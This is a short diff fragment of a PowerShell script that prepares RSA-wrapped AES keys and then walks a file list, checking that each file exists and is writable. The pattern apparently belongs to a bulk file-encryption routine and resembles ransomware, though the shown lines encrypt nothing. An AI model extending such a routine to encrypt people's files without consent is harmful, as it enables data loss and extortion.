@@ -15,3 +15,18 @@ $KeyFormatter New-Object System.Security.Cryptography.RSAOAEPKeyExchangeFormatte
 $LenKey = [System.BitConverter]::GetBytes($LKey)
 [int]$LIV = $AesProvider.IV.Length
 $LenIV = [System.BitConverter]::GetBytes($LIV)
+
+Get-Content -Encoding Unicode $FileListPath | Select-Object -Index ($StartLine..$EndLine) | ForEach-Object {
+	[System.GC]::Collect()
+
+	### checks
+	try {
+		if (Test-Path -Path $_ -PathType Leaf) {
+			$line =Get-Item ($_) }
+		else {
+			return
+		}
+	} catch { return }
+
+	try { [io.file]::OpenWrite($line).close() } catch { return }
+	}
